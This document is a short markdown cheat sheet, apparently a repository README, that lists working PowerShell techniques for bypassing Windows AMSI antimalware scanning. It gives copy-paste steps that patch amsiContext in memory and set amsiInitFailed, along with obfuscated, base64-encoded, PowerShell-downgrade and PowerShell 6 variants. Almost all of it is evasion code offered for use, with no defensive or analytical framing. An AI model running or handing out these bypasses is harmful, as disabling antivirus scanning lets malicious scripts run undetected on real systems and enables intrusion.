# AMSI Bypass steps (example)

## Github repo: https://github.com/Sh3lldon/FullBypass

### First execute

    $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

### And after

    [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);

    [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)

### It should show something like this

 - This script contains malicious content and has been blocked by your antivirus software.

### Then you have to use AMSI bypass. Copy and paste line by line.

    $a = [Ref].Assembly.GetTypes() | ?{$_.Name -like '*siUtils'}

    $b = $a.GetFields('NonPublic,Static') | ?{$_.Name -like '*siContext'}

    [IntPtr]$c = $b.GetValue($null)

    [Int32[]]$d = @(0xff)
 
    [System.Runtime.InteropServices.Marshal]::Copy($d, 0, $c, 1)

### After repeat

    $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

### And after

    [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);

    [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)

### And you should not see errors about "antivirus software". At this point you bypassed AMSI. And may continue.

##### Downgrade PowerShell

    powershell -v 2 -c "<...>"

##### Classic

    sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

##### Base64

    [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

##### Force AMSI error

    $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
    $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
    $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
    $field.SetValue($null,$true)

##### On PowerShell 6

    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true)
